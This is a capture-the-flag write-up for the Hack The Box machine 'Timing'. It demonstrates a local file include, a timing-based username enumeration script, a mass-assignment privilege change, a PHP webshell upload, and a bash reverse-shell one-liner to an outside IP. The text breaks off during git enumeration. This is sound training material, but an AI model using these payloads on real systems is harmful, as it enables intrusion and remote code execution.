---
title: HTB: Timing
url: https://0xdf.gitlab.io/2022/06/04/htb-timing.html
date: 2022-06-04T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-timing, nmap, php, feroxbuster, wfuzz, lfi, directory-traversal, source-code, side-channel, timing, python, bash, youtube, mass-assignment, burp, burp-repeater, webshell, firewall, git, password-reuse, credentials, axel, sudo-home, htb-backendtwo
---

![Timing](https://0xdfimages.gitlab.io/img/timing-cover.png)

Timing starts out with a local file include and a directory traversal that allows me to access the source for the website. I’ll identify and abuse a timing attack to identify usernames on a login form. After logging in, there’s a mass assignment vulnerability that allows me to upgrade my user to admin. As admin, I’ll use the LFI plus upload to get execution. To root, I’ll abuse a download program to overwrite root’s authorized\_keys file and get SSH access. In Beyond Root, I’ll look at an alternative root, and dig more into mass assignment vulnerabilities.

## Box Info

| Name | [Timing](https://hackthebox.com/machines/timing)  [Timing](https://hackthebox.com/machines/timing) [Play on HackTheBox](https://hackthebox.com/machines/timing) |
| --- | --- |
| Release Date | [11 Dec 2021](https://twitter.com/hackthebox_eu/status/1469313414468182017) |
| Retire Date | 04 Jun 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Timing |
| Radar Graph | Radar chart for Timing |
| First Blood User | 00:44:43[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 01:14:25[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [irogir irogir](https://app.hackthebox.com/users/476556) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.135
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-31 20:00 UTC

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.135
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-31 20:00 UTC
Nmap scan report for 10.10.11.135
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.135
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-31 20:01 UTC
Nmap scan report for 10.10.11.135
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 18.04 bionic.

### Website - TCP 80

#### Site

Visiting the main page redirects to `/login.php`, which presents a simple login form:

![image-20220531162055837](https://0xdfimages.gitlab.io/img/image-20220531162055837.png)

Trying to guess some creds doesn’t get anywhere. On failure, the message seems to be the same regardless of if there is a valid user or not:

![image-20220531162158159](https://0xdfimages.gitlab.io/img/image-20220531162158159.png)

#### Tech Stack

The response headers don’t give much beyond what `nmap` found, but the redirect to `login.php` does show it’s a PHP site:

```

HTTP/1.1 302 Found
Date: Tue, 31 May 2022 20:15:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=n816mlei7uluth4glsooa857il; expires=Tue, 31-May-2022 21:15:37 GMT; Max-Age=3600; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ./login.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

```

The `PHPSESSID` cookie also fits there.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.135 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.135
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      309c http://10.10.11.135/js => http://10.10.11.135/js/
301      GET        9l       28w      313c http://10.10.11.135/images => http://10.10.11.135/images/
301      GET        9l       28w      321c http://10.10.11.135/images/uploads => http://10.10.11.135/images/uploads/
302      GET        0l        0w        0c http://10.10.11.135/ => ./login.php
403      GET        9l       28w      277c http://10.10.11.135/.php
302      GET        0l        0w        0c http://10.10.11.135/upload.php => ./login.php
302      GET        0l        0w        0c http://10.10.11.135/logout.php => ./login.php
200      GET      177l      374w     5609c http://10.10.11.135/login.php
200      GET        0l        0w        0c http://10.10.11.135/image.php
302      GET        0l        0w        0c http://10.10.11.135/profile.php => ./login.php
302      GET        0l        0w        0c http://10.10.11.135/index.php => ./login.php
301      GET        9l       28w      310c http://10.10.11.135/css => http://10.10.11.135/css/
302      GET        0l        0w        0c http://10.10.11.135/header.php => ./login.php
200      GET      115l      264w     3937c http://10.10.11.135/footer.php
403      GET        9l       28w      277c http://10.10.11.135/images/.php
403      GET        9l       28w      277c http://10.10.11.135/server-status
200      GET        0l        0w        0c http://10.10.11.135/db_conn.php
[####################] - 3m    300000/300000  0s      found:17      errors:511    
[####################] - 3m     60000/60000   301/s   http://10.10.11.135 
[####################] - 3m     60000/60000   303/s   http://10.10.11.135/js 
[####################] - 3m     60000/60000   305/s   http://10.10.11.135/images 
[####################] - 3m     60000/60000   306/s   http://10.10.11.135/images/uploads 
[####################] - 3m     60000/60000   310/s   http://10.10.11.135/css 

```

Most of the paths just redirect back to `/login.php`, but there are a few that don’t.
- `/.php` returns 403.
- I’ve already looked at `/login.php`.
- `/footer.php` returns a footer that’s included in various pages.
- `/image.php` and `db_conn.php` both return empty pages. For `db_conn.php`, this makes perfect sense. It’s likely a page included in other pages that handles the database connection.

#### Fuzzing /image.php

`image.php` seems like it may be included by other pages to load images. I wonder if there are parameters needed to make one come back. I’ll fuzz with `wfuzz`. If I start without a filter, I’ll see what I noticed above - a bunch of 0 length responses. I’ll use `--hh 0` to hide 0 length responses.

This takes me a few runs to find something. My initial attempt is:

```

wfuzz -u http://10.10.11.135/image.php?FUZZ=junk -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0

```

This doesn’t find anything. I’ll come back again and try with a more realistic location. There’s an image on the login form loaded by:

```

<img src="./images/user-icon.png" width="100" height="100">

```

My first guess is that `image.php` will load from `images`, but trying with just `FUZZ=user-icon.png` returns nothing. However, when I try `FUZZ=images/user-icon.png`, there’s a match:

```

oxdf@hacky$ wfuzz -u http://10.10.11.135/image.php?FUZZ=images/user-icon.png -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.135/image.php?FUZZ=images/user-icon.png
Total requests: 6453

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                
===================================================================

000002803:   200        213 L    1501 W   36611 Ch    "img"                                                  

Total time: 59.01246
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 109.3497

```

If I try that url in Firefox, and it returns a raw image:

![image-20220531173056125](https://0xdfimages.gitlab.io/img/image-20220531173056125.png)

## Authenticate to Site

### Site Source Code

#### LFI POC

Given that `image.php` seems to be loading based on path, I’ll test for directory traversal and local file include. Trying `img=login.php` displays the login page:

![image-20220601162502586](https://0xdfimages.gitlab.io/img/image-20220601162502586.png)

This is local file include, as the file given by the parameter is included, and not just read. Included means that the contents of the file are executed as PHP. If it were just read, the PHP source from `login.php` would be there.

#### Directory Traversal POC

To check for directory traversal, I’ll try a payload like `../../../../../../etc/passwd`. Unfortunately, it triggers some kind of filter:

![image-20220601162656171](https://0xdfimages.gitlab.io/img/image-20220601162656171.png)

In fact, anything with `../` in it triggers. Some playing around with the url shows that anything starting with `/` also seems to trigger.

The `file://` handler also seems to trigger the filter. Finally, I get a break with the `php://filter/convert.base64-encode/resource=/etc/passwd` filter:

![image-20220601163437422](https://0xdfimages.gitlab.io/img/image-20220601163437422.png)

Decoding the result shows `/etc/passwd`:

```

oxdf@hacky$ echo cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash

```

Interestingly, I learned that if you make a typo in your filter (and thus request a non-existent filter), it will just not apply it:

[![image-20220601163611109](https://0xdfimages.gitlab.io/img/image-20220601163611109.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220601163611109.png)

#### Download Source Code

It seems like I can read any file that the current user can access using this kind of URL. If I want a PHP file, I’ll apply the actual `base64-decode` filter to get it that way.

I’ll write a helper script:

```

#!/bin/bash

curl -s "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$1" | base64 -d

```

I’ll use this to download a bunch of the site:

```

oxdf@hacky$ ./download.sh login.php > src/login.php
oxdf@hacky$ ./download.sh upload.php > src/upload.php
oxdf@hacky$ ./download.sh profile.php > src/profile.php
oxdf@hacky$ ./download.sh db_conn.php > src/db_conn.php
oxdf@hacky$ ./download.sh index.php > src/index.php

```

### Source Analysis

#### Not Useful Files

`index.php` isn’t interesting at all:

```

<?php
include_once "header.php";
?>

<h1 class="text-center" style="padding: 200px">You are logged in as user <?php echo $_SESSION['userid']; ?>!</h1>

<?php
include_once "footer.php";
?>

```

`db_conn.php` does contain a password for the DB:

```

<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

```

Without even a username, it’s hard to use it for much (it doesn’t work for root over SSH), or any quick guesses like admin and root to log in.

`profile.php` has some static HTML that gets populated by some user data from the DB, but nothing interesting.

There’s a couple other files that I’ll come back to later, namely `profile_update.php` and `upload.php`.

#### Login

I’ll look at how `login.php` works:

```

if (isset($_GET['login'])) {
    $username = $_POST['user'];
    $password = $_POST['password'];

    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $result = $statement->execute(array('username' => $username));
    $user = $statement->fetch();

    if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
            header('Location: ./index.php');
            return;
        }
    }
    $errorMessage = "Invalid username or password entered";

```

The code is using PDO prepared [statements](https://www.php.net/manual/en/pdo.prepare.php), so it’s not SQL-injectable. On valid username, there is a call to `createTimeChannel`, which is simply a sleep:

```

function createTimeChannel()
{
    sleep(1);
}

```

### Site Login

#### Side Channel / Timing Attack Background

This is not a realistic web application, but rather one constructed to simulate a class of vulnerabilities known as [side-channel attacks](https://en.wikipedia.org/wiki/Side-channel_attack), and a subclass known as [timing attacks](https://en.wikipedia.org/wiki/Timing_attack). In a real application, it may take longer to check a password than a username. That’s because a password is hashed, typically in a way that takes some time. This is a feature of hashing, as if hashing a password doesn’t take some significant amount of time, that means the hash easy to brute force with something like hashcat. Secure hashing functions can take a few hundred milliseconds (tenths of seconds), so it’s not really a drag on the user experience, but it is measurable. So any time an application checks username and then only checks password if it’s a valid username, it’s possible to brute force usernames by looking for the delay.

It looks like perhaps HTB added the `createTimeChannel()` function to make sure this vulnerability is easy to find, since in general this kind of brute force is not expected on HTB. Additionally, for players in high latency environments, a full second should still be noticeable.

#### Manual Tests

If I enter the username admin I’ll notice that the page takes a bit longer to reject my login attempt. I’ll run some tests with `curl` to look at the response times ([this StackOverflow post](https://stackoverflow.com/a/17257787) has a nice explanation of how to `grep` from`time`):

```

oxdf@hacky$ for i in $(seq 1 10); do { time curl -s http://10.10.11.135/login.php?login=true -d 'user=admin&password=admin' >/dev/null; } 2>&1 | grep real; done
real    0m1.255s
real    0m1.252s
real    0m1.300s
real    0m1.304s
real    0m1.257s
real    0m1.322s
real    0m1.277s
real    0m1.300s
real    0m1.256s
real    0m1.296s
oxdf@hacky$ for i in $(seq 1 10); do { time curl -s http://10.10.11.135/login.php?login=true -d 'user=0xdf&password=admin' >/dev/null; } 2>&1 | grep real; done
real    0m0.197s
real    0m0.187s
real    0m0.188s
real    0m0.192s
real    0m0.192s
real    0m0.189s
real    0m0.188s
real    0m0.188s
real    0m0.188s
real    0m0.189s

```

For fun, I can look at the average times for both cases:

![image-20220602065025441](https://0xdfimages.gitlab.io/img/image-20220602065025441.png)

The admin login failure on average takes 1.093 seconds longer. One second of that is the sleep. But there’s still a measurable difference without the sleep, around 93 ms, or a tenth of a second.

#### Script

I’ll write a short Python script to help check usernames. This script takes either a single username, a comma-separated list of usernames, or a path to a file with usernames (one per line). It tries each name, and prints any that take longer than one second.

[This video](https://www.youtube.com/watch?v=tmlxa4Y8wy8) shows the development, as well as the pretty output of the script:

The final source is:

```

#!/usr/bin/env python3

import requests
import sys

try:
    with open(sys.argv[1], 'r') as f:
        names = f.read().split('\n')
except FileNotFoundError:
    names = sys.argv[1].split(',')

for i,name in enumerate(names):
    print(f"\r[{i:04}/{len(names):04}] {name:<70}", end='', flush=True)
    resp = requests.post('http://10.10.11.135/login.php?login=true',
            data={"user": name, "password": "0xdf0xdf"})
    if resp.elapsed.total_seconds() > 1:
        print(f"\r[+] Valid user: {name}")

print("\r" + " "*70)

```

#### Find User

Using some names wordlists from [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Usernames) turns up empty for me, beyond admin. Then I’ll realize that I have users in `/etc/passwd`, which I can make into a wordlist:

```

oxdf@hacky$ ./download.sh /etc/passwd | cut -d: -f1 > passwd-users 

```

The validate script finds aaron:

```

oxdf@hacky$ python3 validate_users.py passwd-users 
[+] Valid user: aaron

```

### Login

Before brute forcing any passwords, I’ll always try a few by hand, including password same as the username, and in this case, it works:

![image-20220602141012053](https://0xdfimages.gitlab.io/img/image-20220602141012053.png)

## Execution as www-data

### Admin Access

#### Edit Profile Page

With access now, I can try to visit `/upload.php`, but it still redirects back to `index.php`.

There’s an additional link, “Edit profile” that goes to `profile.php`:

![image-20220602141236234](https://0xdfimages.gitlab.io/img/image-20220602141236234.png)

Submitting this pops a message at the top of the screen:

![image-20220602141300667](https://0xdfimages.gitlab.io/img/image-20220602141300667.png)

In the background, it sent a POST to `/profile_update.php`:

```

POST /profile_update.php HTTP/1.1
Host: 10.10.11.135
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://10.10.11.135
Connection: close
Referer: http://10.10.11.135/profile.php
Cookie: PHPSESSID=vqnlvq6t19qjfshj7m9vt8ljur

firstName=test&lastName=test&email=test&company=test

```

The response is interesting:

```

HTTP/1.1 200 OK
Date: Thu, 02 Jun 2022 18:12:42 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 419
Connection: close
Content-Type: text/html; charset=UTF-8

{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "0",
    "6": "0",
    "company": "test",
    "7": "test"
}

```

It seems to have dumped the entire user object, even fields that I wasn’t offered to edit.

#### profile\_update.php

Grabbing the source using the LFI, it shows that it is required to have the four parameters shown above:

```

if (empty($_POST['firstName'])) {
    $error = 'First Name is required.';
} else if (empty($_POST['lastName'])) {
    $error = 'Last Name is required.';
} else if (empty($_POST['email'])) {
    $error = 'Email is required.';
} else if (empty($_POST['company'])) {
    $error = 'Company is required.';
}

```

Later in the code, it gets the user object, and updates it:

```

    $id = $_SESSION['userid'];
    $statement = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $result = $statement->execute(array('id' => $id));
    $user = $statement->fetch();

    if ($user !== false) {

        ini_set('display_errors', '1');
        ini_set('display_startup_errors', '1');
        error_reporting(E_ALL);

        $firstName = $_POST['firstName'];
        $lastName = $_POST['lastName'];
        $email = $_POST['email'];
        $company = $_POST['company'];
        $role = $user['role'];

        if (isset($_POST['role'])) {
            $role = $_POST['role'];
            $_SESSION['role'] = $role;
        }

```

It also updates the `role`, even if that field wasn’t available in the form.

#### Mass Assignment

This site is trying to show a [mass assignment vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html). This is a pretty unrealistic way to show this vulnerability (I’ll look at that more in [Beyond Root](#mass-assignment-vulnerabilities)). Still, if I submit more parameters than the site is offering, it will still accept them and update the user.

I noted above that I still can’t access `upload.php`. I also can see in the HTTP response that my current `role` is 0. I’ll try upading that to 1 by sending the POST to `/profile_update.php` to Burp Repeater and adding `&role=1` to the POST body:

[![image-20220602142614978](https://0xdfimages.gitlab.io/img/image-20220602142614978.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220602142614978.png)

The response shows my `role` is now 1!

If I now visit `/index.php`, there’s a new item in the menu bar:

![image-20220602142749028](https://0xdfimages.gitlab.io/img/image-20220602142749028.png)

### Upload Webshell

#### Enumeration

The “Admin panel” link has a form to upload an avatar:

![image-20220602142935157](https://0xdfimages.gitlab.io/img/image-20220602142935157.png)

Trying to upload a legit PNG sends a POST to `/upload.php` which returns:

![image-20220602143752474](https://0xdfimages.gitlab.io/img/image-20220602143752474.png)

#### upload.php Analysis

Rather than try to guess what extensions are allowed, I’ll look at the source. In the middle of the file, the check requires `.jpg`:

```

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

```

Before that, it generates a supposedly unguessable filename for the upload:

```

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;

```

`uniqid()` is a PHP [function](https://www.php.net/manual/en/function.uniqid.php) that gets a unique identifier based on the current time in microseconds. Unfortunately for the author, it’s not using the result, as it’s saved in `$file_hash`, but then the string “$file\_hash” is concatenated with `time()`, not the variable.

`time()` [returns](https://www.php.net/manual/en/function.time.php) the current [epoch time](https://www.epochconverter.com/) in seconds:

```

php > echo time();
1654195320
php > echo time();
1654195322
php > echo time();
1654195322
php > echo time();
1654195322
php > echo time();
1654195325

```

Since the server gives the full timestamp in the response header, so I’ll have all the information needed to calculate the file path.

#### Webshell

I’ll upload a webshell with a `.jpg` extension. I’ll calculate the file location, and then then include that file using `image.php`. Because it uses `include` and not `file_get_contents`, any PHP will be executed.

Create a simple file called `0xdf.jpg`:

```

<?php system($_REQUEST['cmd']); ?>

```

I’ll submit that to the panel, and it responds that it uploaded:

![image-20220602145053640](https://0xdfimages.gitlab.io/img/image-20220602145053640.png)

In Burp, the HTTP response shows the server time of “Thu, 02 Jun 2022 18:50:39 GMT”:

```

HTTP/1.1 200 OK
Date: Thu, 02 Jun 2022 18:50:39 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 27
Connection: close
Content-Type: text/html; charset=UTF-8

The file has been uploaded.

```

I’ll convert that time string to a timestamp in a PHP shell using the `strtotime` [function](https://www.php.net/manual/en/function.strtotime.php):

```

oxdf@hacky$ php -a
Interactive mode enabled

php > $t = "Thu, 02 Jun 2022 18:50:39 GMT";
php > echo strtotime($t);
1654195839

```

The full filename will be:

```

php > echo md5('$file_hash' . strtotime($t)) . '_0xdf.jpg';
3a1889a63cac147772bbf440bbb4bc9e_0xdf.jpg

```

It’s there:

```

oxdf@hacky$ curl 'http://10.10.11.135/images/uploads/3a1889a63cac147772bbf440bbb4bc9e_0xdf.jpg'
<?php system($_REQUEST['cmd']); ?>

```

Visiting it directly isn’t triggering the PHP handler to run it as code, but rather it’s handling it as an image. I can get execution through this webshell using the LFI:

```

oxdf@hacky$ curl 'http://10.10.11.135/image.php?img=images/uploads/3a1889a63cac147772bbf440bbb4bc9e_0xdf.jpg' -d 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Firewall

My first attempt is the basic [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), but it doesn’t return a connection to my listening `nc`:

```

oxdf@hacky$ curl 'http://10.10.11.135/image.php?img=images/uploads/3a1889a63cac147772bbf440bbb4bc9e_0xdf.jpg' -d 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'

```

I’ll try base64-encoding it:

```

oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

```

I’d like to avoid special characters, so I’ll add a couple spaces to get rid of the `+` and the `=`:

```

oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0 
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

Sending that still results in nothing:

```

oxdf@hacky$ curl 'http://10.10.11.135/image.php?img=images/uploads/3a1889a63cac147772bbf440bbb4bc9e_0xdf.jpg' -d 'cmd=echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash'

```

At this point I’m wondering if there’s a firewall blocking outbound. I’ll try some simple `curl` and `nc` commands, but nothing connects back on any port I try.

### Script

I could write a full persistent [forward shell](https://www.youtube.com/watch?v=-ST2FSbqEcU), but I’ll start with a quick script to make enumeration of the file system easier:

```

#!/bin/bash

curl 'http://10.10.11.135/image.php?img=images/uploads/3a1889a63cac147772bbf440bbb4bc9e_0xdf.jpg' -d "cmd=$1"

```

It works, I’ll just need to put all my args in quotes:

```

oxdf@hacky$ ./rce.sh "ls -l /home/"
total 4
drwxr-x--x 5 aaron aaron 4096 Dec  2 18:05 aaron

```

## Shell as aaron

### Enumeration

#### File System

Using my script, I’ll look around the file system. As shown above, there’s a single user home directory, aaron, and www-data can’t access it.

There is a zip archive in `/opt`:

```

oxdf@hacky$ ./rce.sh "ls -l /opt"
total 616
-rw-r--r-- 1 root root 627851 Jul 20  2021 source-files-backup.zip

```

I’ll grab it using the script:

```

oxdf@hacky$ ./rce.sh "cat /opt/source-files-backup.zip" > source-files-backup.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  613k    0  613k  100    36   751k     44 --:--:-- --:--:-- --:--:--  750k

```

And check the hash locally and on Timing:

```

oxdf@hacky$ md5sum source-files-backup.zip 
7fd8d13ab49b661b4d484f809a217810  source-files-backup.zip
oxdf@hacky$ ./rce.sh "md5sum /opt/source-files-backup.zip"
7fd8d13ab49b661b4d484f809a217810  /opt/source-files-backup.zip

```

They match!

#### source-files-backup.zip

Looking at the files in the zip, they are all in a `backup` directory, and there’s a Git repo:

```

oxdf@hacky$ unzip -l source-files-backup.zip
Archive:  source-files-backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2021-07-20 22:34   backup/
     1498  2021-07-20 22:34   backup/header.php
     1740  2021-07-20 22:34   backup/profile_update.php
        0  2021-07-20 22:34   backup/js/
    89476  2021-07-20 22:34   backup/js/jquery.min.js
...[snip]...
        0  2021-07-20 22:34   backup/.git/logs/refs/heads/
      305  2021-07-20 22:34   backup/.git/logs/refs/heads/master
      305  2021-07-20 22:34   backup/.git/logs/HEAD
       92  2021-07-20 22:34   backup/.git/config
     1872  2021-07-20 22:35   backup/.git/index
      200  2021-07-20 22:34   backup/admin_auth_check.php
---------                     -------
   848116                     116 files

```

`git log` shows only two commits:

```

oxdf@hacky$ git log 
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

